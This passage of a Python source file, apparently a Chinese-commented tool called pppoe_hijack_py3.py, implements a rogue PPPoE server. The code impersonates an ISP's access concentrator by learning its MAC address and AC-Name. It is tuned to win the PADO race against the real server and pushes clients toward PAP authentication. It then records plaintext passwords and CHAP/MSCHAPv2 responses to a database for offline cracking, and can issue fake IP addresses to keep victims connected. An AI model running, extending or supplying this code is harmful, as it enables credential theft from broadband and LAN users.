    eapol: str = "off"                        # off | log：记录 802.1X (0x888E) 指纹
    dhcp: str = "off"                         # off | log：记录 DHCP Option 12/60/61/77
    ipv6cp: str = "auto"                      # auto | on | off：双栈 IPv6CP(0x8057)
    ipv6cp_iid: str = ""                      # 我方 Interface-Identifier（缺省按 MAC 生成）
    oui_file: Optional[str] = None            # 自定义 OUI 表（aa:bb:cc,厂商）

    # ---- 派生字段
    auth_list: List[str] = field(default_factory=list)
    ipcp_enabled: bool = False
    ipv6cp_enabled: bool = False
    debug: bool = False                       # -v：打开 DEBUG 日志
    verbose: bool = True                       # 派生：非 -q（一般 INFO 日志开着）
    service_names: List[str] = field(default_factory=list)
    vlan_mode: str = "off"                    # off | auto | force
    vlan_id: Optional[int] = None
    oui_table: Dict[str, str] = field(default_factory=dict)
    iid_bytes: Optional[bytes] = None

    def finalize(self):
        order = [p.strip().lower() for p in str(self.auth_order).split(",")]
        self.auth_list = [p for p in order if p in AUTH_OPTION] or ["pap"]
        if self.learn_ac is None:
            self.learn_ac = self.mac is None
        if self.dst_filter == "auto":
            # 已知真 BRAS MAC → 可以把 BPF 收紧到「只收发给我们的」；
            # 不知道 → 宽松过滤，先能看见再说
            self.dst_filter = "strict" if self.mac else "any"
        if self.ipcp == "auto":
            self.ipcp_enabled = (self.pap_mode == "ack" or self.chap_reply == "success")
        else:
            self.ipcp_enabled = (self.ipcp == "on")
        if self.ipv6cp == "auto":
            self.ipv6cp_enabled = self.ipcp_enabled
        else:
            self.ipv6cp_enabled = (self.ipv6cp == "on")
        self.verbose = not self.quiet          # 兼容字段：非 -q 即"一般日志开着"
        # Service-Name：支持逗号分隔多个（第一个作为默认对外宣告名）
        names = [p.strip() for p in str(self.service_name).split(",") if p.strip()]
        self.service_names = names
        self.service_name = names[0] if names else ""

        # VLAN：off / auto / 强制 ID
        v = str(self.vlan).strip().lower()
        if v in ("", "off", "none", "no", "false", "0"):
            self.vlan_mode, self.vlan_id = "off", None
        elif v == "auto":
            self.vlan_mode, self.vlan_id = "auto", None
        else:
            try:
                self.vlan_id = int(v, 0) & 0xFFF
            except ValueError:
                raise SystemExit("--vlan 只能是 off / auto / 0-4095（可写 0x29）")
            self.vlan_mode = "force"
        self.vlan_prio = int(self.vlan_prio) & 0x7

        # IPv6CP Interface-Identifier：允许 16 位 hex（可带冒号/空格），否则按 MAC 生成 EUI-64
        self.iid_bytes = None
        raw = "".join(c for c in str(self.ipv6cp_iid) if c in "0123456789abcdefABCDEF")
        if len(raw) == 16:
            self.iid_bytes = bytes.fromhex(raw)
        elif str(self.ipv6cp_iid).strip():
            raise SystemExit("--ipv6cp-iid 需要 8 字节十六进制（如 00112233445566aa）")

        try:
            self.oui_table = load_oui_file(self.oui_file) if self.oui_file else dict(OUI_VENDORS)
        except OSError as exc:
            raise SystemExit("读不到 --oui-file %s: %s" % (self.oui_file, exc))
        return self


def load_toml(path: str) -> dict:
    if tomllib is None:
        raise RuntimeError("需要 Python 3.11+ 才能读 TOML 配置")
    with open(path, "rb") as fh:
        data = tomllib.load(fh)
    return data.get("pppoe", data)


def build_config(argv=None) -> Config:
    ap = argparse.ArgumentParser(
        prog="pppoe_hijack_py3.py",
        description="PPPoE 拨号服务器伪装（凭据截获 / 认证诱导）v%s" % __version__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--version", action="version", version=__version__)
    ap.add_argument("-c", "--config", default=None, help="TOML 配置文件（CLI 优先于文件）")
    ap.add_argument("-i", "--iface", default=None, help="监听网卡，如 \"以太网\"")
    ap.add_argument("-m", "--mac", default=None,
                    help="伪装源 MAC；不给则用 %s 起步并尝试学真 BRAS" % DEFAULT_MAC)
    ap.add_argument("--learn-ac", dest="learn_ac", action="store_true", default=None,
                    help="从真 BRAS 的 PADO/PADS 学 MAC 与 AC-Name 并冒充它")
    ap.add_argument("--no-learn-ac", dest="learn_ac", action="store_false",
                    help="关掉冒充学习")
    ap.add_argument("--service-name", dest="service_name", default=None,
                    help="PADO/PADS 里的 Service-Name，默认空")
    ap.add_argument("--ac-name", dest="ac_name", default=None,
                    help="PADO/PADS 里的 AC-Name / CHAP Name，默认 %s" % "^_^")
    ap.add_argument("-s", "--sessionid", type=lambda v: int(v, 0), default=None,
                    help="固定 sessionid（0=每个客户端自动分配）")
    ap.add_argument("--session-ttl", dest="session_ttl", type=float, default=None,
                    help="会话空闲回收秒数（0=不回收）")
    ap.add_argument("--lcp-mode", dest="lcp_mode", choices=("nak", "reject"), default=None,
                    help="回客户端的 LCP-Config-Req：nak(规范) / reject(原版行为)")
    ap.add_argument("--strict-rfc", dest="strict_rfc", action="store_true", default=None,
                    help="去掉原版那 4 个尾 0，LCP-Req 长度字段按 RFC 1661 写 4+len(opts)")
    ap.add_argument("--auth-order", dest="auth_order", default=None,
                    help="认证协议优先顺序，如 pap,mschapv2,chap")
    ap.add_argument("--auth-retry", dest="auth_retry", type=int, default=None,
                    help="认证协议切换次数上限")
    ap.add_argument("--lcp-retry", dest="lcp_retry", type=float, default=None,
                    help="我方 LCP-Config-Req 重传间隔秒")
    ap.add_argument("--lcp-maxretry", dest="lcp_maxretry", type=int, default=None,
                    help="我方 LCP-Config-Req 最大重传次数")
    ap.add_argument("--pap-mode", dest="pap_mode", choices=("nak", "ack"), default=None,
                    help="收到 PAP 后回 Nak（原版，让客户端重拨）还是 Ack（留住会话）")
    ap.add_argument("--chap-reply", dest="chap_reply", choices=("fail", "success"), default=None,
                    help="CHAP 回应 Failure 还是 Success")
    ap.add_argument("--ipcp", choices=("auto", "on", "off"), default=None,
                    help="是否完成 IPCP（下发假地址把客户端留住）")
    ap.add_argument("--ipcp-local", dest="ipcp_local", default=None, help="我方(伪网关)地址")
    ap.add_argument("--ipcp-peer", dest="ipcp_peer", default=None, help="下发给客户端的地址")
    ap.add_argument("--rate", type=int, default=None, help="发包限速（包/秒），0=不限")
    ap.add_argument("--dst-filter", dest="dst_filter", choices=("auto", "strict", "any"), default=None,
                    help="BPF 是否加 ether dst 条件（strict 更快但要求 MAC 已对准）")
    ap.add_argument("-o", "--store", default=None,
                    help="凭据落盘：*.db/*.sqlite/*.sqlite3 = SQLite，其它 = JSONL")
    ap.add_argument("--replay", default=None, help="离线回放 pcap（不需要 Npcap）")
    ap.add_argument("--replay-send", dest="replay_send", action="store_true", default=None,
                    help="回放时真的发包（默认只干跑）")
    ap.add_argument("--pcap-out", dest="pcap_out", default=None,
                    help="把我方发出的帧另存 pcap，便于离线核对")
    ap.add_argument("--dry-run", dest="dry_run", action="store_true", default=None,
                    help="不发包，只打印/存 pcap")
    ap.add_argument("--stats", type=float, default=None, help="统计打印间隔秒（0=关闭）")
    ap.add_argument("-q", "--quiet", action="store_true", default=None, help="静音一般日志")
    ap.add_argument("-v", "--verbose", action="store_true", default=None,
                    help="打开 DEBUG 日志（每个报文的协议/选项细节）")
    ap.add_argument("--list-ifaces", dest="list_ifaces", action="store_true", default=None,
                    help="列出可用网卡后退出")

    grp = ap.add_argument_group("现代光猫/路由器适配")
    grp.add_argument("--profile", choices=sorted(PROFILES), default=None,
                     help="一键参数组合：legacy(2016 原版行为) / modern(家用现代设备) / ont(光猫桥接)")
    grp.add_argument("--vlan", default=None,
                     help="VLAN：off(默认) / auto(跟随客户端) / 0-4095 强制(如 43)")
    grp.add_argument("--vlan-prio", dest="vlan_prio", type=int, default=None,
                     help="802.1p 优先级 0-7（强制 VLAN 时使用）")
    grp.add_argument("--mru", type=int, default=None,
                     help="我方 LCP 提议的 MRU（默认 1480 = 原版字节；现网常见 1492，"
                          "RFC 4638 全速 1500 需客户端带 0x0120）")
    grp.add_argument("--max-payload", dest="max_payload", type=int, default=None,
                     help="PPPoE tag 0x0120 PPP-Max-Payload（RFC 4638；0=不发）")
    grp.add_argument("--ac-cookie", dest="ac_cookie", action="store_true", default=None,
                     help="PADO 带 AC-Cookie(0x0104) 并校验 PADR 是否回显（更逼真）")
    grp.add_argument("--no-ac-cookie", dest="ac_cookie", action="store_false")
    grp.add_argument("--relay-sid", dest="relay_sid", action="store_true", default=None,
                     help="回显客户端的 Relay-Session-Id(0x0110)，默认开")
    grp.add_argument("--no-relay-sid", dest="relay_sid", action="store_false")
    grp.add_argument("--service-strict", dest="service_strict", action="store_true", default=None,
                     help="只服务 --service-name 列出的名字，其它回 PADS+Service-Name-Error")
    grp.add_argument("--multi-session", dest="multi_session", action="store_true", default=None,
                     help="同一 MAC 允许多条会话（光猫/路由器双拨），默认开")
    grp.add_argument("--no-multi-session", dest="multi_session", action="store_false")
    grp.add_argument("--max-sessions", dest="max_sessions", type=int, default=None,
                     help="同一 MAC 的并发会话上限（默认 %d）" % DEFAULT_MAX_SESSIONS)
    grp.add_argument("--eapol", choices=("off", "log"), default=None,
                     help="记录 802.1X(0x888E) 身份指纹（家宽少见，校园/企业常见）")
    grp.add_argument("--dhcp", choices=("off", "log"), default=None,
                     help="记录 DHCP Option 12/60/61/77 设备指纹（光猫/IPTV 常用）")
    grp.add_argument("--ipv6cp", choices=("auto", "on", "off"), default=None,
                     help="是否应答 IPv6CP(0x8057)——双栈光猫会协商它")
    grp.add_argument("--ipv6cp-iid", dest="ipv6cp_iid", default=None,
                     help="我方 Interface-Identifier（8 字节 hex），缺省按客户端 MAC 生成")
    grp.add_argument("--oui-file", dest="oui_file", default=None,
                     help="自定义 OUI 表（每行 aa:bb:cc,厂商）")

    args = ap.parse_args(argv)

    cfg = Config()
    data = {}
    if args.config:
        data = load_toml(args.config)
    profile = args.profile or data.get("profile") or ""
    if profile:
        if profile not in PROFILES:
            raise SystemExit("未知 --profile %r（可选：%s）" % (profile, ", ".join(sorted(PROFILES))))
        for key, val in PROFILES[profile].items():
            setattr(cfg, key, val)
        cfg.profile = profile
    for key, val in data.items():
        if key == "profile":
            continue
        if hasattr(cfg, key) and val is not None:
            setattr(cfg, key, val)
    for key, val in vars(args).items():
        if key in ("config", "profile") or val is None:
            continue
        if key == "verbose":                  # -v 打开的是 DEBUG，落到 cfg.debug
            cfg.debug = bool(val)
            continue
        setattr(cfg, key, val)
    if args.profile:
        cfg.profile = args.profile
    return cfg.finalize()


# ---------------------------------------------------------------- 凭据落盘

class Store:
    """凭据落盘：*.db/*.sqlite* 走 SQLite，其它走 JSONL（一行一条）。

    比原版 `MAC\\tuser\\tpass` 多存：时间戳、sessionid、BRAS MAC、AC-Name、
    认证类型、CHAP 的 challenge/NTResponse、IPCP 地址、原始 hex（供离线爆破）。
    """

    FIELDS = ("ts", "kind", "mac", "vendor", "sessionid", "bras_mac", "ac_name", "auth",
              "username", "password", "peer_challenge", "auth_challenge", "nt_response",
              "response", "lm_response", "ipcp_ip", "ipv6_iid", "vlan", "host_uniq",
              "service_name", "relay_sid", "eapol_identity", "hostname", "vendor_class",
              "client_id", "max_payload", "iface", "raw")

    def __init__(self, path: Optional[str]):
        self.path = path
        self.kind = None
        self.conn = None
        self.fh = None
        self.count = 0
        if not path:
            return
        if path.lower().endswith((".db", ".sqlite", ".sqlite3")):
            self.kind = "sqlite"
            self.conn = sqlite3.connect(path)
            cols = ", ".join("%s TEXT" % f for f in self.FIELDS)
            self.conn.execute("CREATE TABLE IF NOT EXISTS creds "
                              "(id INTEGER PRIMARY KEY AUTOINCREMENT, %s)" % cols)
            self._migrate()
            self.conn.commit()
        else:
            self.kind = "jsonl"
            self.fh = open(path, "a", encoding="utf-8")

    def _migrate(self):
        """老库补列：v2.0 建的 creds 表没有 kind/vendor/vlan 这些新字段。"""
        have = {row[1] for row in self.conn.execute("PRAGMA table_info(creds)")}
        for f in self.FIELDS:
            if f not in have:
                self.conn.execute("ALTER TABLE creds ADD COLUMN %s TEXT" % f)

    def add(self, rec: dict):
        rec = dict(rec)
        rec.setdefault("ts", time.strftime("%Y-%m-%d %H:%M:%S"))
        row = {k: ("" if rec.get(k) is None else str(rec.get(k))) for k in self.FIELDS}
        if self.kind == "sqlite":
            self.conn.execute(
                "INSERT INTO creds (%s) VALUES (%s)" % (",".join(self.FIELDS),
                                                        ",".join("?" * len(self.FIELDS))),
                [row[f] for f in self.FIELDS])
            self.conn.commit()
        elif self.kind == "jsonl":
            self.fh.write(json.dumps(row, ensure_ascii=False) + "\n")
            self.fh.flush()
        self.count += 1

    def close(self):
        if self.conn is not None:
            try:
                self.conn.commit()
                self.conn.close()
            except Exception:
                pass
            self.conn = None
        if self.fh is not None:
            try:
                self.fh.close()
            except Exception:
                pass
            self.fh = None


# ---------------------------------------------------------------- 发送通道

class RateLimiter:
    """令牌桶：--rate 包/秒；0 = 不限速"""

    def __init__(self, pps: int):
        self.pps = float(pps)
        self.cap = max(1.0, float(pps))
        self.tokens = self.cap
        self.ts = time.monotonic()

    def wait(self):
        while True:
            now = time.monotonic()
            self.tokens = min(self.cap, self.tokens + (now - self.ts) * self.pps)
            self.ts = now
            if self.tokens >= 1.0:
                self.tokens -= 1.0
                return
            time.sleep(max(0.001, (1.0 - self.tokens) / self.pps))


class L2Sender:
    """复用同一个二层 socket。

    原版（以及裸用 scapy.sendp）每次调用都会 `conf.L2socket(...)` 新建一个
    套接字 —— 在 PADO 竞速里那是几毫秒级的代价，够真 BRAS 抢答了。
    """

    def __init__(self, iface=None):
        self.iface = iface
        self.sock = conf.L2socket(iface=iface)
        self.count = 0

    def send(self, frame: bytes):
        self.sock.send(frame)
        self.count += 1

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


class DryRunSender:
    """不发包：打印 +（可选）写 pcap，用于 --dry-run / --replay / 离线回归"""

    def __init__(self, pcap_out: Optional[str] = None):
        self.count = 0
        self.frames: List[bytes] = []
        self.writer = PcapWriter(pcap_out, append=True, sync=True) if pcap_out else None

    def send(self, frame: bytes):
        self.count += 1
        self.frames.append(frame)
        if self.writer is not None:
            self.writer.write(Ether(frame))
        log.info("[dry-run] TX(%d) %s", self.count, frame.hex())

    def close(self):
        if self.writer is not None:
            try:
                self.writer.close()
            except Exception:
                pass
            self.writer = None


# ---------------------------------------------------------------- 会话状态

@dataclass
class Session:
    mac: str
    sid: int
    created: float
    last_seen: float
    auth_kind: str = "pap"          # 当前协商中的认证协议
    lcp: str = "initial"            # initial → req_sent → up
    req_ident: int = 0
    last_req: float = 0.0
    retries: int = 0
    auth_switches: int = 0
    nak_count: int = 0
    bad_options: set = field(default_factory=set)
    chap_sent: bool = False
    chap_ident: int = 0
    chap_value: bytes = b""
    authed: bool = False
    ipcp_req_sent: bool = False
    ipcp_nak: int = 0
    ipcp_ip: str = ""
    data_logged: bool = False
    # ---- 现代设备适配（v2.1）
    vlan: bytes = b""               # 跟随客户端的 VLAN tag 原始字节（QinQ 时 8 字节）
    vendor: str = ""                # OUI 识别出的设备厂商
    host_uniq: bytes = b""          # 客户端 Host-Uniq（原样回显）
    service_name: str = ""          # 客户端请求的 Service-Name（回显）
    relay_sid: bytes = b""          # Relay-Session-Id（PPP oE 中继/双拨）
    ac_cookie: bytes = b""          # 我方在 PADO 里给出的 AC-Cookie
    max_payload: int = 0            # 客户端 PPP-Max-Payload（RFC 4638）
    pending: bool = True            # PADR 刚建、还没收到会话帧（PADR 重传复用）
    ipv6cp_req_sent: bool = False
    ipv6_iid: str = ""              # 协商到的 Interface-Identifier（hex）
    # 客户端重传去重: (proto, code, id, 原载荷) → 上次原样发出去的帧
    replied: Dict[tuple, List[bytes]] = field(default_factory=dict)


# ---------------------------------------------------------------- 主体

class PPPoEServer:
    """PPPoE 状态机。handle() 是纯逻辑：输入嗅探到的帧，返回要发出去的帧(bytes)。

    组帧走预构造模板（P1-5）：Ether+PPPoE 头一次成型，运行时只补
    dst / code / sessionid / len / proto，然后拼载荷。
    """

    def __init__(self, cfg: Config, emit: Optional[Callable[[bytes], None]] = None,
                 clock: Callable[[], float] = time.monotonic):
        self.cfg = cfg
        self.emit = emit or (lambda frame: None)
        self.clock = clock
        self.mac = norm_mac(cfg.mac or DEFAULT_MAC)
        self.bras_mac = self.mac          # 学到真 BRAS 后会被替换
        self.ac_name = cfg.ac_name
        self.service_name = cfg.service_name
        self.sessions: Dict[Tuple[str, int], Session] = {}   # (MAC, sessionid) → 会话
        self.pending: Dict[str, Session] = {}                # MAC → 最近 PADR 建的会话
        self.creds: List[dict] = []
        self.events: List[dict] = []                         # 802.1X / DHCP 设备指纹
        self.store: Optional[Store] = None
        self.stats = collections.Counter()
        self._next_sid = 0
        self._hdr_cache: Dict[Tuple[bytes, int, int], bytearray] = {}
        self._cookies: Dict[str, bytes] = {}
        self._eapol_seen: set = set()
        self._dhcp_seen: set = set()
        self.vlan_tag: bytes = b""
        self._build_hdrs()

    # ------------------------------------------------ 头模板

    def _build_hdrs(self):
        """预构造头模板（bytearray）并缓存。

        带 VLAN 时以太头长度变化（每层 tag 4 字节），所以模板按
        (vlan 原始字节, ethertype, 额外空间) 缓存；无 tag 时就是原来那 20/22 字节。
        """
        self._hdr_cache = {}
        self._macb = mac_bytes(self.mac)

    def _hdr(self, vlan: bytes, ethertype: int, extra: int) -> bytearray:
        key = (vlan, ethertype, extra)
        tpl = self._hdr_cache.get(key)
        if tpl is None:
            tpl = bytearray(14 + len(vlan) + extra)
            tpl[6:12] = mac_bytes(self.mac)
            if vlan:
                tpl[12:12 + len(vlan)] = vlan
            tpl[12 + len(vlan):14 + len(vlan)] = ethertype.to_bytes(2, "big")
            if extra:                          # 发现阶段：version/type = 0x11
                tpl[14 + len(vlan)] = 0x11
            self._hdr_cache[key] = tpl
        return bytearray(tpl)

    def _disc(self, dst: str, code: int, sid: int, tags: bytes,
              vlan: bytes = b"") -> bytes:
        vlan = vlan or b""
        f = self._hdr(vlan, ETH_P_PPPOE_DISCOVERY, 6)
        f[0:6] = mac_bytes(dst)
        o = 14 + len(vlan)
        f[o] = 0x11                            # version 1 / type 1
        f[o + 1] = code & 0xFF
        f[o + 2:o + 4] = (sid & 0xFFFF).to_bytes(2, "big")
        f[o + 4:o + 6] = len(tags).to_bytes(2, "big")
        f += tags
        return bytes(f)

    def _sess(self, dst: str, sid: int, proto: int, payload: bytes,
              vlan: bytes = b"") -> bytes:
        vlan = vlan or b""
        if not vlan and self.cfg.vlan_mode != "off":
            # 会话阶段的所有回包（LCP/CHAP/IPCP/IPv6CP）都走这条兜底：
            # VLAN 是记在会话上的，调用方不必每处都传一遍，也就不会漏。
            s = self.sessions.get((norm_mac(dst), int(sid) & 0xFFFF))
            if s is not None and s.vlan:
                vlan = s.vlan
        f = self._hdr(vlan, ETH_P_PPPOE_SESSION, 8)
        f[0:6] = mac_bytes(dst)
        o = 14 + len(vlan)
        f[o] = 0x11                            # version 1 / type 1
        f[o + 1] = 0x00                        # 会话阶段 code=0
        f[o + 2:o + 4] = (sid & 0xFFFF).to_bytes(2, "big")
        f[o + 4:o + 6] = (len(payload) + 2).to_bytes(2, "big")
        f[o + 6:o + 8] = proto.to_bytes(2, "big")
        f += payload
        return bytes(f)

    def _tx(self, frames):
        for frame in frames or ():
            self.emit(frame)

    # ------------------------------------------------ 入口

    def handle(self, pkt) -> List[bytes]:
        """输入一个嗅探到的帧，返回需要发出去的帧列表（无副作用到网卡）。"""
        if not isinstance(pkt, Ether):
            return []
        src, dst = norm_mac(pkt.src), norm_mac(pkt.dst)
        if src == self.mac:                       # 自环防护（原版会无限发包）
            self.stats["self_loop"] += 1
            return []

        # 802.1X / DHCP：旁听记录设备指纹（目的 MAC 不是我们，必须放在 dst 检查之前）
        etype = eth_type(pkt)                     # 穿透 VLAN tag 后再判协议
        if etype == PROTO_EAPOL:
            return self._handle_eapol(pkt)
        if self.cfg.dhcp == "log" and etype == 0x0800:
            return self._handle_dhcp(pkt)

        if etype == ETH_P_PPPOE_DISCOVERY:         # 真 BRAS 的 PADO/PADS 先拿去学（目的 MAC 是别人）
            lyr = pppoe_layer(pkt)
            if lyr is None:
                return []
            if lyr.code in (CODE_PADO, CODE_PADS):
                self._learn_ac(pkt, bytes(getattr(lyr, "payload", b"")))
                return []
        if dst not in (self.mac, BROADCAST):      # 不是发给我们的（BPF 之外的兜底）
            self.stats["not_for_us"] += 1
            return []
        self.stats["pkts"] += 1
        vlan = self._vlan_for(pkt)
        if vlan:
            self.vlan_tag = vlan
            self.stats["vlan"] += 1

        if etype == ETH_P_PPPOE_DISCOVERY:
            lyr = pppoe_layer(pkt)
            if lyr is None:
                return []
            return self._discovery(pkt, lyr, vlan)
        if etype == ETH_P_PPPOE_SESSION:
            return self._session(pkt, vlan)
        return []

    def _vlan_for(self, pkt) -> bytes:
        """决定回包该带什么 VLAN tag：off 不带 / force 强制 / auto 跟随客户端。"""
        mode = self.cfg.vlan_mode
        if mode == "off":
            return b""
        if mode == "force":
            return vlan_tag_bytes(self.cfg.vlan_id or 0, self.cfg.vlan_prio)
        return vlan_tags(pkt)

    def handle_guard(self, pkt):
        """嗅探回调：抓异常 + 把 handle() 的返回值发出去。

        保留 `filterData` 这个名字，和原版的词汇表对齐。
        """
        try:
            self._tx(self.handle(pkt))
        except Exception:
            log.debug("处理报文出错", exc_info=True)

    filterData = handle_guard

    # ------------------------------------------------ 发现阶段

    def _discovery(self, pkt, lyr, vlan: bytes = b"") -> List[bytes]:
        code = lyr.code
        tags = bytes(getattr(lyr, "payload", b""))
        client = norm_mac(pkt.src)

        if code in (CODE_PADO, CODE_PADS):        # 真 BRAS 的应答：只用来学它
            self._learn_ac(pkt, tags)
            return []
        if code == CODE_PADI:
            self.stats["padi"] += 1
            req = self._requested_service(tags)
            if (self.cfg.service_strict and req and self.cfg.service_names
                    and req not in self.cfg.service_names):
                log.info("[!] 客户端要 Service-Name=%r，我们只提供 %s → PADS+Service-Name-Error",
                         req, ",".join(self.cfg.service_names))
                return self._service_name_error(client, req, tags, vlan)
            log.info("PADI阶段开始,发送PADO... (来自 %s%s)", client,
                     (" vlan=%s" % vlan_summary(vlan)) if vlan else "")
            return self.send_pado_packet(pkt, self.padi_find_hostuniq(tags) or b"",
                                         vlan=vlan, service_name=req, raw_tags=tags)
        if code == CODE_PADR:
            self.stats["padr"] += 1
            s = self.pending.get(client)
            if (s is None or (client, s.sid) not in self.sessions
                    or (self.clock() - s.created) > PADR_REUSE_WINDOW):
                # 双拨/多拨：同一 MAC 的每次 PADR 都开一条新会话（不同 sessionid）；
                # 只有「刚建的会话 + 短时间内重传的 PADR」才复用，避免 sid 抖动。
                s = self._new_session(client, vlan=vlan)
            s.pending = False
            s.last_seen = self.clock()
            if vlan:
                s.vlan = vlan
            s.host_uniq = self.padi_find_hostuniq(tags) or b""
            s.relay_sid = find_tag(tags, TAG_RELAY_SESSION_ID) or b""
            s.service_name = self._requested_service(tags) or s.service_name
            s.max_payload = self._max_payload(tags)
            wanted = self._cookies.get(client)
            if self.cfg.ac_cookie and wanted and find_tag(tags, TAG_AC_COOKIE) != wanted:
                self.stats["cookie_miss"] += 1
                log.debug("[*] %s 的 PADR 没带回 AC-Cookie（宽容处理）", client)
            log.info("PADR阶段开始,发送PADS... (来自 %s sessionid=%#06x%s)", client, s.sid,
                     (" vlan=%s" % vlan_summary(s.vlan or vlan)) if (s.vlan or vlan) else "")
            return self.send_pads_packet(pkt, s, s.host_uniq, vlan=s.vlan or vlan)
        if code == CODE_PADT:
            s = self._lookup(client, int(getattr(lyr, "sessionid", 0) or 0))
            if s is not None:
                self._drop(s)
            log.info("[*] 客户端 %s 主动 PADT，回收会话", client)
            return []
        return []

    @staticmethod
    def _requested_service(tags: bytes) -> str:
        """客户端请求的 Service-Name（现代路由器/机顶盒会带；空 tag = 任意服务）"""
        val = find_tag(tags, TAG_SERVICE_NAME)
        return val.decode("utf-8", "replace") if val else ""

    @staticmethod
    def _max_payload(tags: bytes) -> int:
        """PPP-Max-Payload(0x0120)，RFC 4638 baby jumbo"""
        val = find_tag(tags, TAG_PPP_MAX_PAYLOAD)
        return int.from_bytes(val[:2], "big") if val and len(val) >= 2 else 0

    def _service_name_error(self, client: str, req: str, tags: bytes,
                            vlan: bytes = b"") -> List[bytes]:
        """RFC 2516：不提供该服务时回 PADS + Service-Name-Error（比默默不响应更好，
        客户端会立刻换名字重试，而不是卡在发现阶段超时）。"""
        self.stats["service_name_error"] += 1
        body = tag_bytes(TAG_SERVICE_NAME_ERROR, req.encode("utf-8")[:255])
        body += tag_bytes(TAG_AC_NAME, self.ac_name.encode("utf-8")[:255])
        body += (self.padi_find_hostuniq(tags) or b"")
        return [self._disc(client, CODE_PADS, 0x0000, body, vlan=vlan)]

    def _learn_ac(self, pkt, tags: bytes):
        """冒充真 BRAS：把它的 MAC 与 AC-Name 学过来（--learn-ac）"""
        if not self.cfg.learn_ac:
            return
        src = norm_mac(pkt.src)
        name = find_tag(tags, TAG_AC_NAME)
        if src == self.mac:
            return
        new_name = name.decode("utf-8", "replace") if name else None
        if src == self.bras_mac and (not new_name or new_name == self.ac_name):
            return
        self.bras_mac = src
        self.mac = src
        if new_name:
            self.ac_name = new_name
        self._build_hdrs()
        log.info("[*] 学到真 BRAS: MAC=%s AC-Name=%r —— 改为冒充它", self.mac, self.ac_name)

    def _pa_tags(self, host_uniq: bytes = b"", service_name: Optional[str] = None,
                 relay: bytes = b"", cookie: bytes = b"", max_payload: int = 0) -> bytes:
        """PADO/PADS 的 tag 表。

        顺序保持原版风格（Service-Name → AC-Name → Host-Uniq），再按需追加
        Relay-Session-Id / AC-Cookie / PPP-Max-Payload —— 这三样是「现代设备才认」
        的部分，关掉开关就退回 2016 年的字节布局。
        """
        name = self.cfg.service_name if service_name is None else service_name
        out = tag_bytes(TAG_SERVICE_NAME, str(name).encode("utf-8")[:255])
        out += tag_bytes(TAG_AC_NAME, self.ac_name.encode("utf-8")[:255])
        if host_uniq:
            out += host_uniq
        if relay and self.cfg.relay_sid:
            out += tag_bytes(TAG_RELAY_SESSION_ID, relay)
        if cookie:
            out += tag_bytes(TAG_AC_COOKIE, cookie)
        if max_payload and self.cfg.max_payload:
            mpl = min(int(self.cfg.max_payload), 0xFFFF)
            out += tag_bytes(TAG_PPP_MAX_PAYLOAD, mpl.to_bytes(2, "big"))
        return out

    def send_pado_packet(self, pkt, host_uniq: bytes = b"", vlan: bytes = b"",
                         service_name: Optional[str] = None,
                         raw_tags: bytes = b"") -> List[bytes]:
        """PADO: code=0x07 —— 回显 Host-Uniq / Service-Name / Relay-Session-Id(+Cookie)"""
        client = norm_mac(pkt.src)
        relay = find_tag(raw_tags, TAG_RELAY_SESSION_ID) or b""
        mp = self._max_payload(raw_tags) if self.cfg.max_payload else 0
        cookie = b""
        if self.cfg.ac_cookie:
            cookie = self._cookies.get(client) or os.urandom(16)
            self._cookies[client] = cookie
        return [self._disc(client, CODE_PADO, 0x0000,
                           self._pa_tags(host_uniq, service_name, relay, cookie, mp),
                           vlan=vlan)]

    def send_pads_packet(self, pkt, s: Optional[Session] = None,
                         host_uniq: bytes = b"", vlan: bytes = b"") -> List[bytes]:
        """PADS: code=0x65，分配 sessionid 建立假会话"""
        client = norm_mac(pkt.src)
        s = s or self._lookup(client, 0)
        sid = s.sid if s else 0x01
        relay = s.relay_sid if s else b""
        mp = s.max_payload if (s and self.cfg.max_payload) else 0
        cookie = self._cookies.get(client, b"")
        name = s.service_name if (s and s.service_name) else None
        return [self._disc(client, CODE_PADS, sid,
                           self._pa_tags(host_uniq, name, relay, cookie, mp),
                           vlan=vlan or (s.vlan if s else b""))]

    def send_padt_packet(self, s: Session) -> List[bytes]:
        """PADT 会话终止（原版 send_lcp_end_packet）"""
        return [self._disc(s.mac, CODE_PADT, s.sid, b"", vlan=s.vlan)]

    @staticmethod
    def padi_find_hostuniq(tags: bytes) -> Optional[bytes]:
        """找 Host-Uniq(0x0103) 并整体回显（tag 头 + 长度 + 值）"""
        value = find_tag(tags, TAG_HOST_UNIQ)
        if value is None:
            return None
        return tag_bytes(TAG_HOST_UNIQ, value)

    # ------------------------------------------------ 会话阶段

    def _new_session(self, mac: str, sid: Optional[int] = None,
                     vlan: bytes = b"") -> Session:
        now = self.clock()
        s = Session(mac=mac, sid=sid or self._alloc_sid(), created=now,
                    last_seen=now, vlan=vlan or b"")
        s.vendor = oui_vendor(mac, self.cfg.oui_table)
        s.auth_kind = self.cfg.auth_list[0]
        self.sessions[(mac, s.sid)] = s
        self.pending[mac] = s                    # 等 PADR 来认领
        self.stats["sessions"] += 1
        mine = [x for (m, _), x in self.sessions.items() if m == mac]
        cap = max(1, int(self.cfg.max_sessions))
        if len(mine) > cap:
            oldest = min(mine, key=lambda x: x.created)
            if oldest is not s:
                log.info("[!] %s 并发会话超过 %d 条，先回收最早的 sessionid=%#06x",
                         mac, cap, oldest.sid)
                self._drop(oldest)
        log.info("[*] 新会话 %s sessionid=%#06x auth=%s%s", mac, s.sid, s.auth_kind,
                 (" vendor=%s" % s.vendor) if s.vendor else "")
        return s

    def _alloc_sid(self) -> int:
        if self.cfg.sessionid:
            return self.cfg.sessionid & 0xFFFF
        used = {s.sid for s in self.sessions.values()}
        for _ in range(0xFFFF):
            self._next_sid = (self._next_sid + 1) & 0xFFFF or 1
            if self._next_sid not in used:
                return self._next_sid
        return 0x01

    def _lookup(self, mac: str, sid: int = 0) -> Optional[Session]:
        """按 (MAC, sessionid) 找会话；sid 不明时退回该 MAC 最近建立的一条"""
        if sid:
            s = self.sessions.get((mac, sid))
            if s is not None:
                return s
        cand = [x for (m, _), x in self.sessions.items() if m == mac]
        return max(cand, key=lambda x: x.created) if cand else None

    def _drop(self, s: Session):
        """回收一条会话，连带清掉只跟这个 MAC 有关的旁路状态"""
        self.sessions.pop((s.mac, s.sid), None)
        if self.pending.get(s.mac) is s:
            self.pending.pop(s.mac, None)
        if not any(m == s.mac for (m, _) in self.sessions):
            self._cookies.pop(s.mac, None)
            self._eapol_seen.discard(s.mac)
            self._dhcp_seen.discard(s.mac)
